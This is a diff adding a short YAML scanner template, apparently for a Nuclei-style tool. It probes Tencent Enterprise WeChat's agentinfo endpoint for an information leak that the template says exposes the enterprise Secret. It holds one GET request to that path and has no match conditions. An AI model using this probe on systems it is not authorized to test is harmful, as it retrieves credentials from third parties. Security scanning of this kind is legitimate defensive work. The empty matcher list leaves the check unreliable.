@@ -1,0 +1,18 @@
+id: wechat-info-leak
+brief:
+    title: WeChat agentinfo - Information Exposure
+    by: SleepingBag945
+    level: high
+    about: There is an information leakage vulnerability in the agentinfo interface of Tencent Enterprise WeChat. An attacker can obtain the Enterprise WeChat Secret through the vulnerability.
+    label:
+        - wechat
+        - exposure
+        - tencent
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cgi-bin/gateway/agentinfo'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs: []
